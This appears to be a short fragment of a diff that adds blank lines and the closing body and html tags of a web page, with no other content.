+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
